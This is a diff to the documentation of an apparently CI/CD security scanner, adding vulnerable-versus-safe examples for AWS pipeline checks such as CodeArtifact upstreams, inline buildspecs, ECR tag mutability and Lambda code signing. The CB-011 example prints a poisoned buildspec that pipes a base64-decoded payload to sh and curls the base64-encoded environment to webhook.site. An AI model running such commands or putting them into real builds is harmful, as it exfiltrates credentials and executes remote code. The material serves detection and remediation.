@@ -1690,6 +1690,37 @@ steps:
 
 **Recommendation.** Route public package consumption through a pull-through cache repository governed by an allow-list of package names, and point build-time repos at that cache rather than directly at ``public:npmjs``/``public:pypi``. Unscoped public upstreams expose builds to dependency-confusion and typosquatting attacks.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodeArtifact repository wired to a public
+# upstream (npm.org / pypi.org / maven-central) without
+# allow-listing. Internal package names harvested from
+# repo manifests can be claimed on the public upstream
+# with a higher version; CodeArtifact resolves them via
+# the public upstream and ships attacker code to every
+# consumer (Birsan dependency confusion).
+import boto3
+ca = boto3.client('codeartifact')
+ca.create_repository(
+    domain='myorg', repository='shared',
+    upstreams=[{'repositoryName': 'public-pypi-store'}],
+    externalConnections=['public:pypi']
+)
+
+# Safe: drop the public external connection. Mirror only
+# the packages your org actually needs into a curated
+# internal upstream so an arbitrary public publisher
+# can't poison resolution.
+ca.delete_repository_permissions_policy(
+    domain='myorg', repository='shared'
+)
+ca.disassociate_external_connection(
+    domain='myorg', repository='shared',
+    externalConnection='public:pypi'
+)
+```
+
 **Source:** [`CA-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-005`: Outdated managed build image <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-005 }
@@ -1713,6 +1744,37 @@ steps:
 **How this is detected.** An inline buildspec (source.buildspec set to YAML text, or a S3 URL) bypasses the protections that cover your source code. A user with ``codebuild:UpdateProject`` can rewrite the build commands without touching the repository, no PR review, no branch protection, no audit of what changed. Store buildspec.yml in the repo instead.
 
 **Recommendation.** Remove the inline buildspec and store buildspec.yml in the source repository under branch protection. Anyone with codebuild:UpdateProject can silently rewrite an inline buildspec; repository-sourced buildspecs inherit the repo's review and protection controls.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``buildspec`` is inline JSON on the
+# project, not sourced from a protected repo. Anyone
+# with ``codebuild:UpdateProject`` (or who can call the
+# console UI) can rewrite the build steps without a
+# code-review trail. CodeBuild then runs the rewritten
+# spec with the project's role.
+import boto3, json
+cb = boto3.client('codebuild')
+cb.update_project(
+    name='my-build',
+    source={'type': 'NO_SOURCE',
+            'buildspec': json.dumps({'phases': {'build': {'commands': ['malicious']}}})}
+)
+
+# Safe: source ``buildspec.yml`` from a protected repo
+# branch. Changes to the build then route through PR
+# review on the SCM side, and the AWS-side ``UpdateProject``
+# call no longer carries the build's logic.
+cb.update_project(
+    name='my-build',
+    source={
+        'type': 'GITHUB',
+        'location': 'https://github.com/myorg/myrepo.git',
+        'buildspec': 'ci/buildspec.yml'   # path in the repo
+    }
+)
+```
 
 **Source:** [`CB-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -1738,6 +1800,33 @@ steps:
 
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the project's buildspec carries indicators
+# of malicious activity — base64-decoded execution, exfil
+# to webhook.site, miner binaries. Either the buildspec
+# was poisoned via UpdateProject (CB-008) or pulled from
+# a compromised repo.
+# (current buildspec source)
+phases:
+  build:
+    commands:
+      - echo Z2g6Li4uIA== | base64 -d | sh
+      - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the buildspec does only what the build needs.
+# If a check fires here, treat as incident response:
+# rotate the project's role's credentials, audit recent
+# builds, identify the commit / UpdateProject call that
+# introduced the payload.
+phases:
+  build:
+    commands:
+      - make build
+      - aws s3 cp build/ s3://artifacts-bucket/ --recursive
+```
 
 **Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -2036,6 +2125,33 @@ jobs:
 
 **Recommendation.** Switch to a canary or linear deployment configuration (e.g. CodeDeployDefault.LambdaCanary10Percent5Minutes or a custom rolling config) so that defects are caught before they affect all instances or traffic.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``CodeDeployDefault.AllAtOnce``. Every
+# deploy ships to every instance simultaneously. A bad
+# build (or a malicious one) takes the entire fleet down
+# at once; there's no canary window in which a regression
+# could be caught before customer-facing impact.
+import boto3
+cd = boto3.client('codedeploy')
+cd.create_deployment_group(
+    applicationName='my-app',
+    deploymentGroupName='prod',
+    deploymentConfigName='CodeDeployDefault.AllAtOnce',
+    # ...
+)
+
+# Safe: a canary / linear / blue-green config. Bad
+# deploys are caught before they reach the full fleet.
+cd.update_deployment_group(
+    applicationName='my-app',
+    currentDeploymentGroupName='prod',
+    deploymentConfigName='CodeDeployDefault.LambdaCanary10Percent5Minutes',
+    # or 'CodeDeployDefault.HalfAtATime' / 'CodeDeployDefault.OneAtATime'
+)
+```
+
 **Source:** [`CD-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CP-001`: No approval action before deploy stages <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-001 }
@@ -2045,6 +2161,50 @@ jobs:
 **How this is detected.** A pipeline that goes Source -> Build -> Deploy with no Approval action means every commit on the source branch ships, with no human ack between code-merged and code-running-in-prod. The Manual approval action is the intentional pause point, combine with CP-005 for production-tagged stages specifically.
 
 **Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline that goes Source -> Build
+# -> Deploy with no manual approval stage in between.
+# Every commit on the source branch reaches production
+# automatically. A compromised source branch (force
+# push, malicious co-maintainer, leaked CodeCommit
+# credential) ships straight to prod.
+import boto3
+cp = boto3.client('codepipeline')
+cp.create_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [{'actionTypeId': {'category': 'Source', ...}}]},
+            {'name': 'Build', 'actions': [{'actionTypeId': {'category': 'Build', ...}}]},
+            {'name': 'Deploy', 'actions': [{'actionTypeId': {'category': 'Deploy', ...}}]},
+        ],
+        # ...
+    }
+)
+
+# Safe: add a manual approval stage before Deploy. A
+# human reviewer approves each release; an SNS topic
+# can notify the approval group when a release is
+# awaiting decision.
+cp.update_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [...]},
+            {'name': 'Build', 'actions': [...]},
+            {'name': 'Approve', 'actions': [{
+                'name': 'manual-approval',
+                'actionTypeId': {'category': 'Approval',
+                                 'owner': 'AWS',
+                                 'provider': 'Manual', 'version': '1'}}]},
+            {'name': 'Deploy', 'actions': [...]},
+        ],
+    }
+)
+```
 
 **Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -2635,6 +2795,34 @@ steps:
 
 **Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repo with ``imageScanningConfiguration.
+# scanOnPush: false``. Every pushed image lands without
+# a vulnerability scan; the registry's downstream consumers
+# pull whatever CVE-laden base layer the build produced.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_repository(
+    repositoryName='myapp',
+    imageScanningConfiguration={'scanOnPush': False},
+)
+
+# Safe: enable scan-on-push. Pair with Inspector v2
+# enhanced scanning (ECR-007) for continuous re-scans
+# against the latest CVE database. Block deploys on
+# scan failures via an Inspector finding -> EventBridge
+# -> CodePipeline gate.
+ecr.put_image_scanning_configuration(
+    repositoryName='myapp',
+    imageScanningConfiguration={'scanOnPush': True},
+)
+# Enable enhanced scanning org-wide:
+inspector = boto3.client('inspector2')
+inspector.enable(resourceTypes=['ECR'])
+```
+
 **Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }
@@ -2644,6 +2832,31 @@ steps:
 **How this is detected.** Mutable tags mean ``:latest``, ``:v1.0``, and ``:stable`` can be re-pushed silently, the same tag points to different image content over time. Pinning by digest (``sha256:...``) in deployment manifests is the only durable reference; IMMUTABLE on the repo enforces the property registry-side so a forgotten digest reference doesn't drift.
 
 **Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repo with ``imageTagMutability:
+# MUTABLE``. Anyone with ``ecr:PutImage`` (build role,
+# CI/CD credential, leaked token) can push a different
+# image under the same tag, silently swapping what
+# downstream consumers pull next.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_repository(
+    repositoryName='myapp',
+    imageTagMutability='MUTABLE',
+)
+
+# Safe: ``IMMUTABLE``. Tags can only be pushed once;
+# re-pushing the same tag fails. Updates ship as a new
+# version tag (and the digest never collides), forcing
+# downstream consumers to explicitly bump.
+ecr.put_image_tag_mutability(
+    repositoryName='myapp',
+    imageTagMutability='IMMUTABLE',
+)
+```
 
 **Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -2664,6 +2877,35 @@ steps:
 **How this is detected.** AWS supports pull-through cache for ECR Public, Quay, K8s, GitHub Container Registry, GitLab, and Docker Hub. A rule pointing at ``registry-1.docker.io`` without an authenticated credential silently caches whatever the public namespace resolves to.
 
 **Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: an ECR pull-through cache rule with an
+# untrusted upstream registry. Untrusted = anything
+# other than AWS / k8s.io / Docker Hub Verified
+# Publishers. A pull-through cache means ECR fetches
+# from the upstream on first reference and caches the
+# bytes; if the upstream is compromised, those bytes
+# land in your registry and ship to every consumer.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='internal-mirror',
+    upstreamRegistryUrl='https://rando-mirror.example.com',
+)
+
+# Safe: pull-through caches only against well-known
+# upstreams whose publisher controls you trust
+# (Docker Hub Verified, ECR Public, Quay, K8s.io). For
+# anything else, replicate via an org-controlled mirror
+# with content scanning between the upstream and your
+# registry.
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='public-cache',
+    upstreamRegistryUrl='https://public.ecr.aws',
+)
+```
 
 **Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -4515,6 +4757,39 @@ pipeline {
 
 **Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a Lambda function with no CodeSigningConfig
+# attached. Anyone with ``lambda:UpdateFunctionCode`` can
+# push arbitrary code without signature verification; a
+# compromised deploy role ships malicious code into
+# production with no signing gate.
+import boto3
+lambdacli = boto3.client('lambda')
+lambdacli.get_function(FunctionName='process-payment')[
+    'Configuration'
+].get('CodeSigningConfigArn')  # -> None
+
+# Safe: create a Signing Profile + CodeSigningConfig
+# and attach it. Only signed code packages (signed via
+# AWS Signer) can be deployed; unsigned uploads are
+# rejected by Lambda.
+signer = boto3.client('signer')
+prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+csc = lambdacli.create_code_signing_config(
+    AllowedPublishers={'SigningProfileVersionArns': [prof['profileVersionArn']]},
+    CodeSigningPolicies={'UntrustedArtifactOnDeployment': 'Enforce'},
+)
+lambdacli.update_function_configuration(
+    FunctionName='process-payment',
+    CodeSigningConfigArn=csc['CodeSigningConfig']['CodeSigningConfigArn'],
+)
+```
+
 **Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `MVN-001`: pom.xml dependency uses a floating version range <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-001 }
@@ -5515,6 +5790,39 @@ ctx==0.2.2
 **How this is detected.** A revoked or canceled Signer profile invalidates every signature it ever produced. Lambda functions configured to enforce code-signing fail to deploy until the profile is replaced (or, if ``UntrustedArtifactOnDeployment = Warn``, deploy with a CloudWatch warning the operator rarely reads).
 
 **Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: AWS Signer profile is revoked or
+# inactive. Code-signing pipelines that route through
+# this profile silently fail (or fall back to
+# unsigned artifacts if the gate is permissive); the
+# unsigned artifacts then deploy without integrity
+# verification.
+import boto3
+signer = boto3.client('signer')
+signer.get_signing_profile(profileName='prod-lambda-signer')
+# {'status': 'Revoked', 'statusReason': 'compromise suspected'}
+
+# Safe: investigate the revocation, rotate to a new
+# profile if compromise is confirmed, or restore the
+# original if revoked in error. Either way, the
+# downstream pipeline reference (CodeSigningConfig on
+# Lambdas) must be updated to point at the active
+# profile so signed deploys resume.
+new_prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer-v2',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+lambdacli = boto3.client('lambda')
+lambdacli.update_code_signing_config(
+    CodeSigningConfigArn='arn:aws:lambda:us-east-1:123:code-signing-config:csc-...',
+    AllowedPublishers={
+        'SigningProfileVersionArns': [new_prof['profileVersionArn']]
+    },
+)
+```
 
 **Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
